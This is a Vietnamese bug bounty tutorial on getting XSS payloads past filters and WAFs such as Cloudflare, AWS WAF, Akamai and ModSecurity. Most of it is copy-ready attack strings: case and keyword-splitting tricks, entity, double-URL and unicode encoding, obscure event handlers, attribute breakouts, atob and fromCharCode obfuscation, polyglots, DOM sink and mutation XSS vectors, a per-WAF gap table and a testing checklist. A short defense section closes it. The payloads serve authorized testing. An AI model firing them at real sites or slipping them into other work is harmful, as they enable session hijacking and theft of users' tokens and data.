# Kỹ thuật Bypass Filter & WAF cho XSS: Payload thực chiến

Mỗi payload XSS bạn bắn trong chương trình bug bounty rồi cũng sẽ đụng phải một bộ lọc: blocklist phía server, sanitizer phía client, hoặc một WAF (Web Application Firewall) đầy đủ như Cloudflare hay AWS WAF đứng trước ứng dụng. Sự khác biệt giữa một báo cáo bị đóng và một khoản tiền thưởng mức critical gần như luôn nằm ở việc bạn có đưa được cùng đoạn JavaScript đó qua bộ lọc hay không. Hướng dẫn này là một tài liệu tham khảo thực tế, sẵn sàng copy — các kỹ thuật bypass filter và WAF cho XSS: thay đổi chữ hoa/thường, mẹo mã hóa, thẻ và event handler thay thế, phá vỡ thuộc tính, obfuscation JavaScript, polyglot, DOM sink, và mutation XSS — với các payload thực sự thực thi. Nếu bạn muốn một thư viện rộng hơn để tham khảo trong lúc test, hãy mở cheat sheet XSS của chúng tôi ở tab khác.

## Tại sao Filter XSS và WAF thất bại: Blocklist vs Allowlist

Gần như mọi kỹ thuật bypass trong hướng dẫn này đều khai thác cùng một nguyên nhân gốc: bộ lọc dùng **blocklist** (cấm các chuỗi xấu đã biết như `<script>`, `onerror`, `alert`) thay vì **allowlist** (chỉ cho phép output đã biết là an toàn thông qua mã hóa nhận biết ngữ cảnh). Một blocklist chỉ có thể chặn những gì mà tác giả của nó đã nghĩ tới. Ngược lại, HTML, JavaScript và bộ phân tích URL chấp nhận vô số cú pháp tương đương — chữ hoa/thường hỗn hợp, comment, entity, nhiều lớp mã hóa, hàng trăm event handler. Không gian các biểu diễn tương đương là vô hạn, còn blocklist thì luôn hữu hạn. Chính sự bất đối xứng đó là lý do WAF chỉ là một "gờ giảm tốc", không phải giải pháp.

**Các lớp bypass được dùng nhiều nhất đối với mục tiêu có filter (minh họa, %)**
- Thẻ/event handler thay thế: 34%
- Mã hóa (entity / URL / unicode): 28%
- Thay đổi case & tách từ khóa: 21%
- Phá vỡ thuộc tính / dấu nháy: 19%
- DOM sink / `javascript:` URI: 16%
- Obfuscation JS (fromCharCode / atob): 12%
- Mutation XSS (mXSS): 7%

Biểu đồ trên là một phân tích minh họa, đại diện cho các lớp bypass mà một tester thường xuyên luân phiên dùng với input đã bị filter — đây không phải một nghiên cứu được trích dẫn, chỉ là cảm nhận về tần suất sử dụng tương đối. Điểm mấu chốt là không có một mẹo nào chiếm ưu thế: bạn xoay vòng qua các lớp cho đến khi một cái khớp với ngữ cảnh phản chiếu và điểm mù của bộ lọc.

## Thay đổi Case và Tách Từ khóa

Các blocklist đơn giản nhất thực hiện so khớp chuỗi con theo đúng chữ hoa/thường cho `<script>` hoặc `onerror`. Tên thẻ và thuộc tính HTML không phân biệt chữ hoa/thường, nên chữ hoa/thường hỗn hợp đi thẳng qua:

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
<svg OnLoAd=alert(1)>
```

Nếu bộ lọc loại bỏ chuỗi `<script>` đúng một lần và không đệ quy, bạn có thể lồng từ khóa vào nhau để sau khi xóa bản sao bên trong, phần còn lại ghép thành một thẻ hợp lệ — mẹo **tách từ khóa** kinh điển:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

Khoảng trắng và một số ký tự điều khiển giữa tên thẻ và thuộc tính cũng là dấu phân cách hợp lệ trong HTML — dấu gạch chéo, xuống dòng, tab, hoặc form feed đều hoạt động ở nơi bộ lọc chỉ mong đợi dấu cách:

```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<img src=x
onerror=alert(1)>
```

## Mã hóa Bypass: Decoder nào chạy trong Ngữ cảnh nào

Mã hóa là lớp bypass hiệu quả nhất, nhưng chỉ khi bạn mã hóa cho đúng decoder thực sự chạy tại điểm phản chiếu. Chọn sai lớp thì payload vẫn nằm im. Đây là quy tắc ngón tay cái cho mỗi ngữ cảnh.

**HTML entity encoding** được bộ phân tích HTML giải mã, nên nó hoạt động trong ngữ cảnh HTML body và thuộc tính — và rất tuyệt để giấu scheme `javascript:` bên trong một `href`:

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
<img src=x onerror="&#97;lert(1)">
<a href="javascript&colon;alert(1)">x</a>
```

**URL và double-URL encoding** được server hoặc router giải mã trước khi input của bạn chạm tới điểm phản chiếu. Nếu WAF kiểm tra request thô nhưng ứng dụng URL-decode một lần (hoặc hai lần) trước khi xử lý, double-encoding sẽ giấu dấu ngoặc nhọn khỏi WAF trong khi vẫn tạo ra thẻ thật sau khi ứng dụng giải mã xong:

```
# single-encoded
%3Cscript%3Ealert(1)%3C%2Fscript%3E
# double-encoded (WAF thấy %253C; app giải mã hai lần thành <)
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

**Unicode \u escapes** được engine JavaScript giải mã, nên chúng thuộc về ngữ cảnh JS, không phải HTML thô. Một escape `\u` hợp lệ ngay cả bên trong một định danh, cho phép bạn đánh vần một cái tên bị chặn như `alert` mà chuỗi literal không bao giờ xuất hiện trong source. Lưu ý rằng escape hex `\x` chỉ hợp lệ bên trong string literal — `\x61lert(1)` như một câu lệnh trần là SyntaxError, nên hãy dùng `\u` khi escape một định danh:

```html
<script>\u0061lert(1)</script>
<script>window['\u0061lert'](1)</script>
```

Trộn các lớp là nơi bộ lọc vỡ nặng nhất. Chuỗi HTML entity, URL và unicode theo đúng thứ tự với pipeline mã hóa, và dùng công cụ encode/decode để xác nhận chính xác mục tiêu của bạn thực hiện bao nhiêu lượt decode trước khi bạn chốt payload.

## Thẻ và Event Handler Thay thế khi `<script>` bị chặn

Nếu `<script>` biến mất hoàn toàn, bạn không cần nó — bất kỳ phần tử nào kích hoạt event handler JavaScript đều hoạt động. Các blocklist liệt kê `onerror` và `onload` thường quên cái đuôi dài của các handler. Các lựa chọn đáng tin cậy, hiện đại:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

Handler `<details ontoggle>` và `<body onpageshow>` đặc biệt hữu ích vì nhiều bộ lọc quét mạnh `onload` và `onerror` chưa bao giờ thêm chúng. Để brute-force các kết hợp thẻ và handler đối với một bộ lọc cụ thể, trình tạo payload XSS sẽ liệt kê chúng cho bạn; để xem danh sách đầy đủ được phân loại, hãy xem hướng dẫn payload XSS tối thượng.

## Ngữ cảnh Thuộc tính và Phá vỡ Dấu nháy

Khi input của bạn rơi vào bên trong thuộc tính của một thẻ đã có, bạn thường không cần một thẻ mới — bạn thoát khỏi dấu nháy và tiêm một handler vào phần tử hiện tại. Cách phá vỡ đúng phụ thuộc vào cách giá trị được đặt trong dấu nháy:

```
# bên trong thuộc tính nháy kép: value="INPUT"
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
# bên trong thuộc tính nháy đơn: value='INPUT'
'><svg onload=alert(1)>
' autofocus onfocus=alert(1) x='
# bên trong thuộc tính không nháy: value=INPUT
x onmouseover=alert(1)
x autofocus onfocus=alert(1)
```

Nếu dấu ngoặc nhọn bị filter nhưng dấu nháy thì không, bạn có thể ở lại trong thẻ hiện tại và thêm một handler mà không bao giờ mở phần tử mới — điều này đánh bại các bộ lọc chỉ theo dõi `<` và `>`:

```
" onpointerover=alert(1) "
" style=animation-name:x onanimationstart=alert(1) "
```

## Obfuscation JavaScript: fromCharCode, atob, và Gọi Không Ngoặc

Khi input của bạn đã ở trong ngữ cảnh JS (hoặc bạn kiểm soát một handler) nhưng bộ lọc chặn tên hàm, dấu ngoặc, hoặc chữ `alert` literal, obfuscation sẽ tái tạo cuộc gọi lúc runtime. Xây chuỗi từ mã ký tự để không có từ khóa bị chặn nào xuất hiện trong source:

```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

Base64 giấu payload khỏi bất kỳ signature nào đang theo dõi `alert` hoặc `document.cookie` — giải mã nó bằng `atob` lúc runtime:

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

Nếu dấu ngoặc bị chặn, một tagged template literal gọi hàm mà không cần chúng; nếu tên `alert` bị chặn, truy cập nó động qua `window` hoặc `top` (dấu backtick được hiển thị là `&#96;` ở đây — gõ một backtick literal khi bạn bắn nó):

```html
<script>setTimeout`alert(1)`</script>
<svg onload=top["al"+"ert"](1)>
<img src=x onerror=window[atob('YWxlcnQ=')](1)>
```

Mã hóa kiểu JSFuck đẩy điều này đến cực đoan — bất kỳ JavaScript nào cũng có thể được biểu diễn chỉ bằng sáu ký tự `[ ] ( ) ! +`, vượt qua các bộ lọc cho rằng code phải chứa chữ cái. Nó dài dòng nhưng có giá trị đối với các blocklist chữ-số. Bộ mã hóa WAF tự động hóa fromCharCode, base64 và obfuscation unicode để bạn có thể lặp nhanh thay vì tự tay viết từng biến thể.

## Polyglot XSS: Một Payload Bắn qua Nhiều Ngữ cảnh

Polyglot là một chuỗi duy nhất được thiết kế để phá vỡ nhiều ngữ cảnh — HTML body, thuộc tính, JS string, comment — để bạn có thể xịt nó vào các điểm phản chiếu chưa biết mà không cần fingerprint ngữ cảnh trước. Polyglot kiểu 0xsobky kinh điển vẫn hiệu quả (backtick được hiển thị là `&#96;`):

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Một cái ngắn hơn, đáng tin cậy cho phản chiếu HTML-và-thuộc tính:

```
"><svg onload=alert(1)>//'
```

Polyglot đánh đổi độ dài để lấy độ phủ. Chúng lý tưởng cho lần fuzz đầu tiên qua nhiều tham số; khi bạn xác nhận một hit, hãy thay bằng một payload tối giản, đặc thù ngữ cảnh để có proof of concept sạch.

## DOM-Based XSS và Bypass Sink phía Client

DOM XSS không bao giờ đi vòng qua server, nên WAF phía server hoàn toàn không thấy nó — lỗ hổng nằm trong một sink phía client xử lý dữ liệu source do attacker kiểm soát (`location.hash`, `location.search`, `document.referrer`, `postMessage`). Các sink khác nhau chấp nhận payload khác nhau. `innerHTML` sẽ không chạy một `<script>` trần, nên hãy dùng một phần tử tự kích hoạt:

```js
// sink: el.innerHTML = location.hash.slice(1)
#<img src=x onerror=alert(document.domain)>
```

Một sink `iframe srcdoc` render một tài liệu HTML đầy đủ, và entity-encoding markup bên trong giấu nó khỏi các kiểm tra chuỗi ngây thơ trong khi parser vẫn giải mã nó:

```html
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
```

Khi sink là một phép gán `href`, `src`, hoặc `window.location`, một URI `javascript:` sẽ thực thi — và case, khoảng trắng, và entity đều obfuscate scheme:

```
javascript:alert(1)
javascript&colon;alert(1)
jAvAsCrIpT:alert(1)
java%0ascript:alert(1)
```

## Mutation XSS (mXSS)

Mutation XSS khai thác khoảng cách giữa những gì sanitizer phân tích và những gì trình duyệt phân tích lại. Một sanitizer (ngay cả DOMPurify ở các trạng thái cũ hoặc cấu hình sai) kiểm tra markup, quyết định nó an toàn, và ghi nó trở lại — nhưng khi trình duyệt serialize lại và parse lại output đó, parser HTML biến đổi nó thành thứ có thể thực thi. Các cấu trúc bên trong `<svg>`, `<math>`, `<noscript>`, hoặc thuộc tính dị dạng là những tác nhân phổ biến vì quy tắc parse của chúng khác HTML thường:

```html
<svg><style><img src=x onerror=alert(1)></style></svg>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

mXSS hiếm hơn và khó tìm hơn, nhưng nó bypass các sanitizer chặn mọi kỹ thuật ở trên — luôn giữ sanitizer và cấu hình của nó ở phiên bản mới nhất, vì hầu hết các vector mXSS đã biết đều được vá một cách bị động.

## Xu hướng đặc thù của WAF

Các WAF xuất xưởng với ruleset mặc định được tinh chỉnh cho các payload phổ biến; những khoảng trống dưới đây là xu hướng đại diện mà các thợ săn bug bounty báo cáo, không phải bảo đảm tuyệt đối hay vĩnh viễn — mỗi triển khai được tinh chỉnh khác nhau và rule thay đổi thường xuyên. Luôn test, đừng bao giờ giả định.

| WAF | Lớp bypass thường qua được |
|-----|----------------------------|
| Cloudflare | Event handler ít phổ biến (`ontoggle`, `onpointerover`) và obfuscation JS nặng (`atob` / `fromCharCode`) |
| AWS WAF | Double hoặc mixed encoding và dấu phân cách khoảng trắng không quy ước giữa tag và handler |
| Akamai | Polyglot và vector dựa trên SVG / animation tránh từ khóa `script` literal |
| ModSecurity / OWASP CRS | Mức paranoia thấp bỏ sót từ khóa bị tách case và scheme `javascript:` được mã hóa entity |

**Sơ đồ luồng:**
```
Input attacker
(param / hash / header)
        ↓
Filter / WAF
so khớp blocklist?
        ↓
Áp dụng biến thể bypass
case / encode / alt-tag / obfuscate
        ↓
Reflection / DOM sink
HTML, attribute, JS, URL
        ↓
JavaScript thực thi
alert / đánh cắp cookie / chiếm tài khoản
```

## Checklist Kiểm thử Toàn diện

Làm theo danh sách này từ trên xuống dưới đối với mọi tham số reflected, stored và DOM-reachable. Mỗi dòng đều sẵn sàng copy (gõ một backtick literal ở nơi bạn thấy `&#96;`).

```
[ ] Baseline:        <script>alert(1)</script>
[ ] Case variation:  <ScRiPt>alert(1)</sCrIpT>
[ ] Keyword split:   <scr<script>ipt>alert(1)</scr</script>ipt>
[ ] Whitespace var:  <svg/onload=alert(1)>
[ ] Alt tag (img):   <img src=x onerror=alert(1)>
[ ] Alt tag (svg):   <svg onload=alert(1)>
[ ] Obscure handler: <details open ontoggle=alert(1)>
[ ] Obscure handler: <body onpageshow=alert(1)>
[ ] Attr breakout:   "><img src=x onerror=alert(1)>
[ ] No-tag attr:     " autofocus onfocus=alert(1) x="
[ ] HTML entities:   <img src=x onerror="&#97;lert(1)">
[ ] Double URL enc:  %253Cscript%253Ealert(1)%253C%252Fscript%253E
[ ] Unicode escape:  <script>\u0061lert(1)</script>
[ ] fromCharCode:    eval(String.fromCharCode(97,108,101,114,116,40,49,41))
[ ] eval(atob()):    eval(atob('YWxlcnQoMSk='))
[ ] No-paren call:   setTimeout`alert(1)`
[ ] Polyglot:        "><svg onload=alert(1)>//'
[ ] javascript URI:  javascript:alert(1)  (trong sink href/src/location)
[ ] srcdoc sink:     <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
[ ] mXSS:            <svg><style><img src=x onerror=alert(1)></style></svg>
[ ] Xác nhận thực thi out-of-band (DNS/HTTP beacon) cho blind XSS
```

## Tác động Thực tế

Một bypass filter hoạt động biến "WAF chặn nó" thành một phát hiện critical. Mức độ nghiêm trọng chảy trực tiếp từ việc JavaScript tùy ý chạy trong phiên đã xác thực của nạn nhân:

- **Chiếm phiên và chiếm tài khoản** — đọc `document.cookie` (nếu không HttpOnly) hoặc, đáng tin cậy hơn, cưỡi phiên để thực hiện hành động đặc quyền và đặt lại thông tin đăng nhập của nạn nhân.
- **Đánh cắp token và PII** — exfiltrate JWT, CSRF token, API key, và dữ liệu cá nhân từ DOM hoặc local storage tới endpoint do attacker kiểm soát.
- **Stored XSS sâu bọ** — một payload sống sót qua bộ lọc và tồn tại (profile, comment, ticket) có thể tự lan truyền tới mọi người xem, nâng một bug thành xâm phạm hàng loạt.
- **Pivot vào admin-panel** — blind XSS kích hoạt trong back-office hoặc support console trao cho attacker một chỗ đứng đã xác thực trong ngữ cảnh đặc quyền cao nhất.
- **Tác động kinh doanh** — với chủ chương trình là thiệt hại danh tiếng, rủi ro pháp lý vì lộ PII, và gian lận; với thợ săn là sự khác biệt giữa mức thưởng medium và critical.

Vì bộ lọc là kiểm soát duy nhất đứng giữa báo cáo và thực thi, bypass thường là toàn bộ writeup — ghi lại payload chính xác và chuỗi decode đã làm nó bắn.

## Phòng thủ: Tại sao WAF là Gờ giảm tốc, không phải Giải pháp

Mọi thứ ở trên hoạt động vì ứng dụng dựa vào việc phát hiện input xấu thay vì xử lý an toàn mọi input. Người phòng thủ nên coi WAF là phòng thủ theo chiều sâu và sửa bug thật:

- **Mã hóa output nhận biết ngữ cảnh** — encode khi output cho đúng ngữ cảnh (HTML body, attribute, JS, URL). Đây là một allowlist của các biểu diễn an toàn và vô hiệu hóa case, encoding, và mẹo obfuscation cùng một lúc.
- **Auto-escaping của framework** — dùng escaping mặc định của React, Angular, hoặc Vue và không bao giờ chạm tới `dangerouslySetInnerHTML`, `v-html`, hoặc `bypassSecurityTrust*` với dữ liệu người dùng.
- **Content-Security-Policy nghiêm ngặt** — CSP dựa trên nonce hoặc hash không có `unsafe-inline` chặn các handler và script inline được tiêm ngay cả khi payload lọt qua, biến nhiều bypass thành ngõ cụt.
- **Trusted Types** — khóa các DOM sink (`innerHTML`, `srcdoc`) để các phép gán không an toàn throw thay vì thực thi, giết các vector DOM và mXSS từ gốc.
- **Giữ sanitizer luôn cập nhật** — nếu bạn phải render HTML phong phú, dùng một sanitizer được duy trì và cập nhật nó kịp thời, vì các bản vá mXSS được phát hành bị động.

Một WAF mua thời gian và nâng ngưỡng nhiễu, nhưng một tester quyết tâm cuối cùng sẽ tìm ra một cú pháp mà nó chưa bao giờ liệt kê. Sửa encoding và CSP, và các bypass ở trên không còn quan trọng nữa. Để tiếp tục luyện tập với ngữ cảnh bị filter, hãy tạo các biến thể mới với trình tạo payload XSS, xếp lớp encoding trong pipeline mã hóa, và obfuscate signature với bộ mã hóa WAF — sau đó xác minh từng bước decode trong công cụ encode/decode trước khi bắn.